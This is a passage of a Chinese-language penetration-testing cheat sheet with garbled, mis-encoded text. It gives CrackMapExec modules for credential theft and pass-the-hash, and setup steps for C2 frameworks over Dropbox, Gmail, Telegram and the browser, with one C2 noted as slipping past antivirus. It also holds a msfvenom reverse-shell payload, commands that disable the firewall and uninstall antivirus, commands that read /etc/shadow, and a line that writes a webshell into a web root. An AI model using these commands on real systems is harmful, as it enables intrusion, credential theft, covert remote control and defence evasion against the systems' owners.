get_netrdpsession åˆ—å‡ºæ´»åŠ¨çš„RDPä¼šè¯
gpp_autologin ä»åŸŸæ§ä¸­registry.xmlæŸ¥æ‰¾è‡ªåŠ¨ç™»å½•çš„è´¦æˆ·å¯†ç 
gpp_password ç»„ç­–ç•¥å‡­æ®ä¸­è¿”å›GPPå¯†ç 
invoke_sessiongopher ä¿å­˜putty,winscp,filezilla,superputty rdpçš„session
invoke_vnc æ³¨å…¥ä¸€ä¸ªvncå®¢æˆ·ç«¯åˆ°å†…å­˜
met_inject ä¸msfäº¤äº’
mimikatz è°ƒç”¨mimikatzæ¨¡å—
mimikatz_enum_chrome ä½¿ç”¨mimikatzè§£å¯†chromeä¿å­˜çš„å¯†ç 
mimikatz_enum_vault_creds è§£å¯†windowså‡­æ®ç®¡ç†å™¨ä¸­ä¿å­˜çš„å¯†ç 
mimikittenz æ‰§è¡Œå’ªå’ªçŒ«(windowså¯†ç è·å–è½¯ä»¶)
multirdp å…è®¸å¤šç”¨æˆ·ç™»å½•RDP
netripper é€šè¿‡API hookingæˆªå–å¹³å¸¸
pe_inject DLL/EXEæ³¨å…¥
rdp å¼€å¯æˆ–å…³é—­RDP
shellcode_inject æ³¨å…¥shellcode
tokens åˆ—ä¸¾å¯ç”¨token
uac æŸ¥çœ‹UACæ˜¯å¦å¼€å¯
wdigest å¼€å¯æˆ–å…³é—­wdigest
web_delivery æ‰§è¡Œexploit/multi/script/web_deliveryæ¨¡å—
æŸ¥çœ‹æ¨¡å—çš„é€‰é¡¹
&gt;crackmapexec smb -M module --options
</code></pre>
<p><img src="./img/255.png" alt="image"></p>
<pre><code>ä½¿ç”¨æ–¹å¼
&gt;crackmapexec smb &lt;target(s)&gt; -u user -p &#39;P@ssw0rd&#39; -M module -o å‚æ•°=å€¼
</code></pre>
<p><img src="./img/256.png" alt="image"></p>
<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><pre><code>&gt;crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH
&gt;crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH
</code></pre>
<h4 id="æ‰§è¡Œå‘½ä»¤-1"><a href="#æ‰§è¡Œå‘½ä»¤-1" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h4><pre><code>&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -x &#39;command&#39;
</code></pre>
<p><img src="./img/257.png" alt="image"></p>
<pre><code>-Xæ‰§è¡Œpowershellå‘½ä»¤
&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -X &#39;POWESHELL&#39;
</code></pre>
<h3 id="koadic"><a href="#koadic" class="headerlink" title="koadic"></a>koadic</h3><pre><code>https://github.com/zerosum0x0/koadic
&gt;git clone https://github.com/zerosum0x0/koadic.git
&gt;cd koadic
&gt;pip3 install -r requirements.txt
&gt;./koadic
</code></pre>
<h3 id="SILENTTRINITY"><a href="#SILENTTRINITY" class="headerlink" title="SILENTTRINITY"></a>SILENTTRINITY</h3><pre><code>https://github.com/byt3bl33d3r/SILENTTRINITY
ç±»ä¼¼cobalt strike+empireçš„ç»“åˆ
&gt;git clone https://github.com/byt3bl33d3r/SILENTTRINITY
&gt;pip3 install --user pipenv &amp;&amp; pipenv install &amp;&amp; pipenv shell
&gt;python st.py
æœåŠ¡ç«¯æ‰§è¡Œ
&gt;python3 st.py teamserver &lt;teamserver_ip&gt; &lt;teamserver_password&gt;
&gt;python3 st.py teamserver 192.168.0.108 123456
ä¹Ÿå¯åŠ å‚æ•°--portæŒ‡å®šç«¯å£
</code></pre>
<p><img src="./img/258.png" alt="image"></p>
<pre><code>å®¢æˆ·ç«¯æ‰§è¡Œ
&gt;python3 st.py client wss://&lt;username&gt;:&lt;teamserver_password&gt;@&lt;teamserver_ip&gt;:5000
&gt;python3 st.py client wss://y:123456@192.168.0.108:5000
</code></pre>
<p><img src="./img/259.png" alt="image"></p>
<pre><code>&gt;listenerså‘½ä»¤è¿›å…¥ç›‘å¬å™¨ç›®å½•
&gt;use httpé€‰æ‹©ç›‘å¬å™¨
&gt;optionså‘½ä»¤æŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°
</code></pre>
<p><img src="./img/260.png" alt="image"></p>
<pre><code>&gt;set Port 8081 ä½¿ç”¨setå‘½ä»¤é…ç½®å‚æ•°
&gt;start å¯åŠ¨ç›‘å¬å™¨
&gt;listæŸ¥çœ‹è¿è¡Œä¸­çš„ç›‘å¬å™¨
</code></pre>
<p><img src="./img/261.png" alt="image"></p>
<pre><code>&gt;stop httpä½¿ç”¨stop+ç›‘å¬å™¨åå­—åœæ­¢ç›‘å¬å™¨
&gt;stagersè¿›å…¥payloadç›®å½•
&gt;liståˆ—å‡ºå¯ç”¨payload
</code></pre>
<p><img src="./img/262.png" alt="image"></p>
<pre><code>&gt;use payloadname å‘½ä»¤use+payloadåå­—
&gt;generate http generate+ç›‘å¬å™¨åå­—ç”Ÿæˆpayload
</code></pre>
<p><img src="./img/263.png" alt="image"></p>
<h3 id="Browser-C2"><a href="#Browser-C2" class="headerlink" title="Browser C2"></a>Browser C2</h3><pre><code>360å…¨å¥—+ç«ç»’æ²¡æœ‰æ‹¦æˆª
ç¼ºç‚¹:ä¼šæœ‰é»‘æ¡†ï¼Œå¹¶ä¸”æ‰“å¼€chromeæµè§ˆå™¨ï¼ŒåŠŸèƒ½é™åˆ¶
https://github.com/0x09AL/Browser-C2
&gt;go get -u github.com/gorilla/mux
&gt;go get -u github.com/chzyer/readline
&gt;git clone https://github.com/0x09AL/Browser-C2.git
/Browser-C2/agent/agent.goä¿®æ”¹C2åœ°å€
</code></pre>
<p><img src="./img/264.png" alt="image"></p>
<pre><code>ä¿®æ”¹chromeçš„ä½ç½®
</code></pre>
<p><img src="./img/265.png" alt="image"></p>
<pre><code>ç¼–è¯‘å®¢æˆ·ç«¯
&gt;CGO_ENABLED=1 GOARCH= GOOS=windows go build
</code></pre>
<p><img src="./img/266.png" alt="image"></p>
<pre><code> /Browser-C2/static/jquery.jsä¿®æ”¹æ§åˆ¶æœåŠ¡å™¨IP
</code></pre>
<p><img src="./img/267.png" alt="image"></p>
<pre><code>è½¬åˆ°ä¸»ç›®å½•ç¼–è¯‘æœåŠ¡å™¨ç«¯
&gt;go build
é¶æœºæ‰§è¡Œç”Ÿæˆå¥½çš„å®¢æˆ·ç«¯
æ”»å‡»æœºç›‘å¬
</code></pre>
<p><img src="./img/268.png" alt="image"></p>
<pre><code>æ­¤æ¡†æ¶ä¸é¶æœºä¹‹é—´é€šä¿¡æœªåŠ å¯†ï¼ŒåŠŸèƒ½æœ‰é™ï¼Œå¯ä¸msfã€csã€poshc2ã€empireç­‰æ¡†æ¶å»ºç«‹è”ç³»ã€‚
</code></pre>
<h3 id="DropBox-C2"><a href="#DropBox-C2" class="headerlink" title="DropBox C2"></a>DropBox C2</h3><pre><code>&gt;git clone https://github.com/Arno0x/DBC2 dbc2
&gt;cd dbc2
&gt;pip install -r requirements.txt
&gt;chmod +x dropboxC2.py
https://www.dropbox.com/developers/apps/create
åˆ›å»ºå¥½åè¦ç”Ÿæˆä¸ªaccesstokenï¼Œå¡«å…¥config.pyä¸­
</code></pre>
<p><img src="./img/269.png" alt="image"></p>
<pre><code>æ‰§è¡Œ
</code></pre>
<p><img src="./img/270.png" alt="image"></p>
<pre><code>è¿™é‡Œéœ€è®¾ç½®ä¸€ä¸ªä¸å—æ§æœºäº¤äº’çš„åŠ å¯†å¯†ç 
å‘å¸ƒagent
&gt;publishStage dbc2_agent.exe
ä½¿ç”¨å‘½ä»¤listPublishedStageå¯ä»¥çœ‹åˆ°å·²å‘å¸ƒçš„agent
</code></pre>
<p><img src="./img/271.png" alt="image"></p>
<pre><code>ç”Ÿæˆpayload
&gt;genStager [tab]æŸ¥çœ‹å¯ç”Ÿæˆçš„æ ¼å¼
</code></pre>
<p><img src="./img/272.png" alt="image"></p>
<pre><code>&gt;genStager oneliner defaultç”Ÿæˆpowershellæ ¼å¼payload
</code></pre>
<p><img src="./img/273.png" alt="image"></p>
<pre><code>&gt;genStager batch defaultç”Ÿæˆbatæ ¼å¼
</code></pre>
<p><img src="./img/274.png" alt="image"></p>
<pre><code>Msbuildï¼Œå…¶ä½™ä¸åšæ¼”ç¤º
</code></pre>
<p><img src="./img/275.png" alt="image"></p>
<pre><code>è¿™é‡Œä½¿ç”¨powershellæ ¼å¼çš„ï¼Œåœ¨å—æ§æœºè¿è¡Œ
</code></pre>
<p><img src="./img/276.png" alt="image"></p>
<pre><code>æ”»å‡»æœºå¯ä»¥çœ‹åˆ°ä¸Šçº¿
</code></pre>
<p><img src="./img/277.png" alt="image"></p>
<pre><code>&gt;listå‘½ä»¤å¯ä»¥çœ‹åˆ°å·²æ§æœºå™¨
</code></pre>
<p><img src="./img/278.png" alt="image"></p>
<pre><code>ä½¿ç”¨useå‘½ä»¤ä¸å—æ§æœºå™¨äº¤äº’
</code></pre>
<p><img src="./img/279.png" alt="image"></p>
<pre><code>è¾“å…¥?è·å¾—åç»­å‘½ä»¤
</code></pre>
<p><img src="./img/280.png" alt="image"></p>
<h3 id="Gmail-C2"><a href="#Gmail-C2" class="headerlink" title="Gmail C2"></a>Gmail C2</h3><h4 id="Gcat"><a href="#Gcat" class="headerlink" title="Gcat"></a>Gcat</h4><pre><code>https://myaccount.google.com/lesssecureapps
å¯ç”¨è®¾ç½®
</code></pre>
<p><img src="./img/281.png" alt="image"></p>
<pre><code>Gmailå¯ç”¨imap
</code></pre>
<p><img src="./img/282.png" alt="image"></p>
<pre><code>å°†ä»¥ä¸‹è„šæœ¬è½¬æ¢ä¸ºexe
# setup.py
from distutils.core import setup
import py2exe
 
setup(console=[&#39;implant.py&#39;])
https://github.com/byt3bl33d3r/gcat
æŠŠgcaté¡¹ç›®ä¸­çš„implant.pyè·Ÿä»¥ä¸Šè„šæœ¬æ”¾åœ¨åŒä¸€ç›®å½•ï¼Œä¿®æ”¹implant.pyä¸­çš„è´¦æˆ·ä¿¡æ¯
</code></pre>
<p><img src="./img/283.png" alt="image"></p>
<pre><code>&gt;python 1.py py2exeæ‰“åŒ…
distç›®å½•ä¸‹ç”Ÿæˆimplant.exeå—æ§æœºæ‰§è¡Œ
åŒæ—¶ä¹Ÿè¦ä¿®æ”¹é¡¹ç›®ä¸­gcat.pyä¸­çš„è´¦æˆ·ä¿¡æ¯
</code></pre>
<p><img src="./img/284.png" alt="image"></p>
<pre><code>åœ¨å—æ§æœºæ‰§è¡Œimplant.exeï¼Œå¦‚æœæŠ¥é”™ä¿®æ”¹emailæ¨¡å—ä»¥ä¸‹ä¸‰è¡Œ
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
</code></pre>
<p><img src="./img/285.png" alt="image"></p>
<pre><code>æ‰§è¡Œåï¼Œé‚®ç®±ä¼šæ”¶åˆ°ä¿¡æ¯
</code></pre>
<p><img src="./img/286.png" alt="image"></p>
<pre><code>ä½¿ç”¨gcat.pyä¹Ÿå¯ä»¥å¾—åˆ°å½“å‰ä¼šè¯
&gt;python gcat.py -list
</code></pre>
<p><img src="./img/287.png" alt="image"></p>
<pre><code>ç°åœ¨å¯å¯¹å…¶è¿›è¡Œæ§åˆ¶
&gt;python gcat.py -id [id] -cmd &#39;net user&#39;
</code></pre>
<p><img src="./img/288.png" alt="image"></p>
<pre><code>ç”Ÿæˆjobidï¼ŒæŒ‡å®šjobidå¯æŸ¥çœ‹å›æ˜¾
</code></pre>
<p><img src="./img/289.png" alt="image"></p>
<pre><code>é‚®ç®±ä¸­ä¹Ÿå­˜åœ¨
</code></pre>
<p><img src="./img/290.png" alt="image"></p>
<pre><code>å½“å—æ§æœºä¸ºä¸­æ–‡ç³»ç»Ÿæ—¶ï¼Œå›æ˜¾ä¼šæŠ¥é”™ï¼Œä¿®æ”¹ä»£ç 
</code></pre>
<p><img src="./img/291.png" alt="image"></p>
<pre><code>å…¶ä»–æ¨¡å—æœ‰å›æ˜¾çš„ç›´æ¥ä¿®æ”¹åé‡æ–°py2exeæ‰“åŒ…å³å¯ã€‚
æ”¯æŒçš„åŠŸèƒ½:cmd,upload/download,æ‰§è¡Œshellcode,é”®ç›˜è®°å½•,æˆªå±ç­‰
</code></pre>
<h4 id="Gdog"><a href="#Gdog" class="headerlink" title="Gdog"></a>Gdog</h4><pre><code>https://github.com/maldevel/gdog
åŠŸèƒ½æ›´å¤š:
åŠ å¯†ä¼ è¾“ã€åœ°ç†ä½ç½®ã€æ‰§è¡Œå‘½ä»¤ã€ä¸Šä¼ ä¸‹è½½ã€shellcodeã€æˆªå›¾ã€é”®ç›˜è®°å½•ã€å…³é—­é‡å¯ã€æ³¨é”€ç”¨æˆ·ã€ä»webä¸‹è½½ã€è®¿é—®ç½‘ç«™ç­‰
é…ç½®æµç¨‹åŸºæœ¬ä¸€æ ·ï¼Œéœ€è¦æ‰“åŒ…exeï¼Œä½†æ˜¯è¦å®‰è£…ä¸€äº›æ¨¡å—PyCryptoã€WMIã€Enum34ã€Netifaces
# setup.py
from distutils.core import setup
import py2exe
 
setup(console=[&#39;client.py&#39;])
client.pyåœ¨å›æ˜¾å¤„ä¹Ÿè¦æ·»åŠ decode gbk
æ‰§è¡Œclient.exeæŠ¥è¶…å‡ºç´¢å¼•é”™è¯¯æ—¶
åœ¨client.pyä¸­æœç´¢å­—ç¬¦ä¸²for iface in netifaces.interfaces():
åœ¨å®ƒä¸‹é¢ä¸€è¡Œä¿®æ”¹ä¸º
if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0][&#39;addr&#39;] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):
æ‰“åŒ…å¥½åæ‰§è¡Œ
</code></pre>
<p><img src="./img/292.png" alt="image"><br><img src="./img/293.png" alt="image"><br><img src="./img/294.png" alt="image"><br><img src="./img/295.png" alt="image"></p>
<pre><code>æå–jobidå›æ˜¾å‡ºé”™çš„è¯ï¼Œæ·»åŠ 
reload(sys)
sys.setdefaultencoding(&quot;utf-8&quot;)
æ‰§è¡Œshellcode
&gt;msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python
å»é™¤å¼•å·åŠ å‡å·ï¼Œåªä¿ç•™shellcodeç²˜è´´åˆ°æ–‡ä»¶shell.txt
&gt;python gdog.py -id &#123;id&#125; -exec-shellcode /tmp/shell.txt
</code></pre>
<h3 id="Telegram-C2"><a href="#Telegram-C2" class="headerlink" title="Telegram C2"></a>Telegram C2</h3><pre><code>ç™»å½•telegram
è®¿é—®https://telegram.me/botfatherï¼Œå‘é€æ¶ˆæ¯
</code></pre>
<p><img src="./img/296.png" alt="image"></p>
<pre><code>åˆ›å»ºä¸€ä¸ªbot
</code></pre>
<p><img src="./img/297.png" alt="image"></p>
<pre><code>åˆ›å»ºå®Œæˆåè¿”å›ä¸€ä¸ªtoken
&gt;pip install telepot
&gt;pip install requests
&gt;git clone https://github.com/blazeinfosec/bt2.git
ç¼–è¾‘bt2.py
ç²˜è´´tokenå’Œchatidè¿›è„šæœ¬
Chat_idçš„è·å–æ–¹å¼
https://api.telegram.org/bot&lt;token&gt;/getUpdates
</code></pre>
<p><img src="./img/298.png" alt="image"><br><img src="./img/299.png" alt="image"></p>
<pre><code>å½“æœ‰å—æ§æœºä¸Šçº¿æ—¶ä¼šåˆ—å‡ºåŠŸèƒ½
</code></pre>
<p><img src="./img/300.png" alt="image"><br><img src="./img/301.png" alt="image"></p>
<pre><code>Windows
https://github.com/sf197/Telegra_Csharp_C2
</code></pre>
<h2 id="ä¿¡æ¯æ”¶é›†-2"><a href="#ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h3><pre><code>&gt;whoami /user æŸ¥çœ‹å½“å‰ç”¨æˆ·SID
&gt;net config Workstation æŸ¥çœ‹å½“å‰è®¡ç®—æœºä¿¡æ¯
&gt;net time /domain åˆ¤æ–­ä¸»åŸŸ
é”™è¯¯5ï¼šå­˜åœ¨åŸŸï¼Œå½“å‰ä¸æ˜¯åŸŸç”¨æˆ·
æ˜¾ç¤ºæ—¶é—´ï¼šå­˜åœ¨åŸŸï¼Œå½“å‰æ˜¯åŸŸå†…ç”¨æˆ·
æ‰¾ä¸åˆ°åŸŸï¼šä¸å­˜åœ¨
&gt;net view /domain åˆ—å‡ºåŸŸåˆ—è¡¨
&gt;net group &quot;Domain Controllers&quot; /domainæŸ¥çœ‹ä¸»åŸŸæ§
&gt;nltest /DCLIST:zone.com æŸ¥çœ‹åŸŸæ§
&gt;net group &quot;domain admins&quot; /domain æŸ¥çœ‹åŸŸç®¡ç†å‘˜
&gt;net group &quot;enterprise admins&quot; /domain æŸ¥çœ‹ä¼ä¸šç®¡ç†å‘˜åˆ—è¡¨
&gt;net localgroup administrators /domain æŸ¥çœ‹ç®¡ç†ç»„ç”¨æˆ·
&gt;net group &quot;domain computers&quot; /domain æŸ¥çœ‹åŸŸæˆå‘˜è®¡ç®—æœº
&gt;net accounts /domain æŸ¥çœ‹å¯†ç ç­–ç•¥
&gt;net user /domainæŸ¥çœ‹åŸŸå†…ç”¨æˆ·
&gt;net view /domain:dc æŸ¥è¯¢åŸŸå†…è®¡ç®—æœº
&gt;netsh firewall set opmode disable/enable å…³é—­windowsé˜²ç«å¢™(win2003)
&gt;netsh advfirewall set allprofiles state off/on(å¤§äºwin2003)
&gt;arp -aæŸ¥çœ‹arpè¡¨
&gt;net start æŸ¥çœ‹æœåŠ¡
&gt;route printæŸ¥çœ‹è·¯ç”±è¡¨
&gt;query useræŸ¥çœ‹ç™»å½•æœºå™¨çš„ç”¨æˆ·çš„è¿æ¥çŠ¶æ€
&gt;tasklist /v æŸ¥çœ‹åŸŸç®¡ç†å‘˜è¿›ç¨‹
&gt;dsquery serveræŸ¥è¯¢åŸŸæ§åˆ¶å™¨
&gt;dsquery computer æŸ¥è¯¢åŸŸå†…æœºå™¨
&gt;dsquery user æŸ¥è¯¢åŸŸç”¨æˆ·
&gt;dsquery ou åŸŸå†…ç»„ç»‡å•ä½
å¯¼å‡ºåŸŸDNSè®°å½•ï¼Œæ–‡ä»¶ä¿å­˜åœ¨C:\Windows\System32\dns\
&gt;dnscmd /zoneexport zone.com 1.txt
å¯¼å‡ºLDAPæ•°æ®åº“
&gt;LDIFDE -f c:\windows\temp\dump.ldf -n -m
</code></pre>
<h3 id="Wmi"><a href="#Wmi" class="headerlink" title="Wmi"></a>Wmi</h3><pre><code>&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Versionç³»ç»Ÿç‰ˆæœ¬
&gt;wmic service list brief åˆ—å‡ºæœ¬æœºæœåŠ¡
&gt;wmic process list brief åˆ—å‡ºè¿›ç¨‹
&gt;wmic process where name=&quot;chrome.exe&quot; get executablepathè¿›ç¨‹è·¯å¾„
&gt;wmic process get caption,commandline /value&gt;&gt;1.txtæŸ¥è¯¢æ‰€æœ‰è¿›ç¨‹å‚æ•°
&gt;wmic process where caption=&quot;svchost.exe&quot; get caption,commandline /value æŸ¥è¯¢æŸä¸ªè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°
åˆ›å»ºè¿›ç¨‹
&gt;wmic process call create calc
&gt;wmic process call create &quot;C:\shell.exe&quot;
&gt;wmic process call create &quot;shutdown.exe -r -f -t 20&quot;
ç»“æŸè¿›ç¨‹
&gt;wmic process where name=&quot;shell.exe&quot; call terminate
&gt;wmic process where processid=&quot;2345&quot; delete
&gt;wmic process 2345 call terminate
&gt;wmic startup list brief åˆ—å‡ºè‡ªå¯åŠ¨ç¨‹åº
&gt;wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List æŸ¥çœ‹æ€æ¯’è½¯ä»¶
&gt;wmic netuse list brief åˆ—å‡ºå…±äº«é©±åŠ¨ç›˜
&gt;wmic ntdomain list brief æŸ¥è¯¢åŸŸæ§åˆ¶å™¨
&gt;wmic useraccount list brief åˆ—å‡ºæœ¬æœºç®¡ç†å‘˜åŠSID
&gt;wmic qfe list brief åˆ—å‡ºè¡¥ä¸åˆ—è¡¨
&gt;wmic share get name,path æŸ¥çœ‹å…±äº«
&gt;wmic startup list briefæŸ¥çœ‹å¯åŠ¨é¡¹
&gt;wmic product get name,version æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶
&gt;wmic product where &quot;name like &#39;%360%&#39;&quot; get name æŸ¥çœ‹ç¨‹åºå
&gt;wmic product where name=&quot;360tray&quot; call uninstall å¸è½½ç¨‹åº
&gt;wmic process where &quot;name like &#39;%360%&#39;&quot; get name æŸ¥æ‰¾è¿›ç¨‹å…¨å
&gt;wmic product where name=&quot;360tray.exe&quot; call terminate åœæ­¢ç¨‹åº
&gt;wmic desktop get screensaversecure,screensavertimeout æŸ¥çœ‹å±ä¿
</code></pre>
<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><pre><code>è·å–åŸŸä¿¡æ¯
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Get-NetDomain&#125;&quot;
</code></pre>
<p><img src="./img/302.png" alt="image"></p>
<pre><code>&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; get-netforest&#125;&quot;
</code></pre>
<p><img src="./img/303.png" alt="image"></p>
<pre><code>æšä¸¾ç®¡ç†å‘˜
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin&#125;&quot;
</code></pre>
<p><img src="./img/304.png" alt="image"></p>
<pre><code>æŸ¥è¯¢ç®¡ç†åœ¨çº¿çš„æœºå™¨
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-userhunter&#125;&quot;
</code></pre>
<p><img src="./img/305.png" alt="image"></p>
<pre><code>æŸ¥çœ‹åŸŸå†…æœºå™¨ä»¥administratoræƒé™è¿è¡Œçš„è¿›ç¨‹
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter &#125;&quot;
</code></pre>
<p><img src="./img/306.png" alt="image"></p>
<pre><code>æˆ–æŒ‡å®šå‚æ•°userfileå’ŒcomputerfileæŸ¥è¯¢æŸå°æœºå™¨æŸä¸ªç”¨æˆ·çš„è¿›ç¨‹
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt&#125;&quot;
</code></pre>
<p><img src="./img/307.png" alt="image"></p>
<pre><code>æŸ¥è¯¢åŸŸå†…æœºå™¨å…±äº«
&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-sharefinder&#125;&quot;
</code></pre>
<p><img src="./img/308.png" alt="image"></p>
<pre><code>æŸ¥è¯¢åŸŸå†…æœºå™¨
&gt;Get-NetComputer -Domain zone.com
</code></pre>
<p><img src="./img/309.png" alt="image"></p>
<pre><code>&gt;Find-LocalAdminAccess -verbose æŸ¥è¯¢åŸŸå†…æœ¬åœ°ç”¨æˆ·èƒ½ç™»å½•çš„æœºå™¨
</code></pre>
<p><img src="./img/310.png" alt="image"></p>
<pre><code>Dev-powerview
è·å–åŸŸæ§æœºå™¨å’Œwinç‰ˆæœ¬
&gt;Get-DomainController |select name,osversion|fl 
</code></pre>
<h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><pre><code>æ“ä½œç³»ç»Ÿ&amp;å†…æ ¸ç‰ˆæœ¬&amp;ç¯å¢ƒå˜é‡
&gt;cat /etc/issue
&gt;cat /etc/*-release
&gt;cat /etc/lsb-release
&gt;cat /etc/redhat-release
cat /proc/version
&gt;uname -a
&gt;uname -mrs
&gt;rpm -q kernel
&gt;dmesg | grep Linux
&gt;ls /boot | grep vmlinuz-
&gt;cat /etc/profile
&gt;cat /etc/bashrc
&gt;cat ~/.bash_profile
&gt;cat ~/.bashrc
&gt;cat ~/.bash_logout
&gt;env
&gt;set
Rootæƒé™è¿›ç¨‹
&gt;ps aux | grep root
&gt;ps -ef | grep root
è®¡åˆ’ä»»åŠ¡
&gt;crontab -l
&gt;ls -alh /var/spool/cron
&gt;ls -al /etc/ | grep cron
&gt;ls -al /etc/cron*
&gt;cat /etc/cron*
&gt;cat /etc/at.allow
&gt;cat /etc/at.deny
&gt;cat /etc/cron.allow
&gt;cat /etc/cron.deny
&gt;cat /etc/crontab
&gt;cat /etc/anacrontab
&gt;cat /var/spool/cron/crontabs/root
IPä¿¡æ¯
&gt;/sbin/ifconfig -a
&gt;cat /etc/network/interfaces
&gt;cat /etc/sysconfig/network
è¿æ¥ä¿¡æ¯
&gt;grep 80 /etc/services
&gt;netstat -antup
&gt;netstat -antpx
&gt;netstat -tulpn
&gt;chkconfig --list
&gt;chkconfig --list | grep 3:on
&gt;last
&gt;w
ç”¨æˆ·ä¿¡æ¯
&gt;id
&gt;whomi
&gt;w
&gt;last
&gt;cat /etc/passwd
&gt;cat /etc/group
&gt;cat /etc/shadow
&gt;ls -alh /var/mail/
&gt;grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;   # åˆ—å‡ºè¶…çº§ç”¨æˆ·
&gt;awk -F: &#39;($3 == &quot;0&quot;) &#123;print&#125;&#39; /etc/passwd   #åˆ—å‡ºè¶…çº§ç”¨æˆ·
&gt;cat /etc/sudoers
&gt;sudo â€“l
æ“ä½œè®°å½•
&gt;cat ~/.bash_history
&gt;cat ~/.nano_history
&gt;cat ~/.atftp_history
&gt;cat ~/.mysql_history
&gt;cat ~/.php_history
å¯å†™ç›®å½•
&gt;find / -writable -type d 2&gt;/dev/null      # å¯å†™ç›®å½•
&gt;find / -perm -222 -type d 2&gt;/dev/null     # å¯å†™ç›®å½• 
&gt;find / -perm -o w -type d 2&gt;/dev/null     # å¯å†™ç›®å½•
&gt;find / -perm -o x -type d 2&gt;/dev/null     # å¯æ‰§è¡Œç›®å½•
&gt;find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # å¯å†™å¯æ‰§è¡Œç›®å½•
</code></pre>
<h2 id="HTTPæœåŠ¡"><a href="#HTTPæœåŠ¡" class="headerlink" title="HTTPæœåŠ¡"></a>HTTPæœåŠ¡</h2><pre><code>&gt;python2 -m SimpleHTTPServer 
&gt;python3 -m http.server 8080
&gt;php -S 0.0.0.0:8888
&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 â€“WWW
&gt;ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888,:DocumentRoot =&gt; Dir.pwd).start&quot;
&gt;ruby -run -e httpd . -p 8888
</code></pre>
<h2 id="æ–‡ä»¶æ“ä½œ-1"><a href="#æ–‡ä»¶æ“ä½œ-1" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><h3 id="WindowsæŸ¥æ‰¾æ–‡ä»¶"><a href="#WindowsæŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="WindowsæŸ¥æ‰¾æ–‡ä»¶"></a>WindowsæŸ¥æ‰¾æ–‡ä»¶</h3><pre><code>&gt;cd /d E: &amp;&amp; dir /b /s index.php
&gt;for /r E:\ %i in (index*.php) do @echo %i
&gt;powershell Get-ChildItem d:\ -Include index.php -recurse
</code></pre>
<h3 id="LinuxæŸ¥æ‰¾æ–‡ä»¶"><a href="#LinuxæŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="LinuxæŸ¥æ‰¾æ–‡ä»¶"></a>LinuxæŸ¥æ‰¾æ–‡ä»¶</h3><pre><code>#find / -name index.php
æŸ¥æ‰¾æœ¨é©¬æ–‡ä»¶
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;
&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;
</code></pre>
<h3 id="åˆ›å»º"><a href="#åˆ›å»º" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h3><pre><code>è¯»æ–‡æœ¬æ–‡ä»¶ï¼š
&gt;file = Get-Content &quot;1.txt&quot;
&gt;file
&gt;powershell Set-content &quot;1.txt&quot; &quot;wocao&quot;
&amp;
&gt;powershell &quot;write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\&quot;d2Vic2hlbGw=\&quot;))) | out-file -filepath c:\www\wwwroot\1.aspx;&quot;
</code></pre>
<h3 id="å‹ç¼©"><a href="#å‹ç¼©" class="headerlink" title="å‹ç¼©"></a>å‹ç¼©</h3><pre><code>&gt;rar.exe a â€“k â€“r â€“s â€“m3 C:\1.rar C:\wwwroot
&gt;7z.exe a â€“r â€“p12345 C:\1.7z C:\wwwroot
</code></pre>
<h3 id="è§£å‹"><a href="#è§£å‹" class="headerlink" title="è§£å‹"></a>è§£å‹</h3><pre><code>&gt;rar.exe e c:\wwwroot\1.rar
&gt;7z.exe x â€“p12345 C:\1.7z â€“oC:\wwwroot
</code></pre>
<h3 id="ä¼ è¾“"><a href="#ä¼ è¾“" class="headerlink" title="ä¼ è¾“"></a>ä¼ è¾“</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><pre><code>&gt;open 192.168.0.98 21
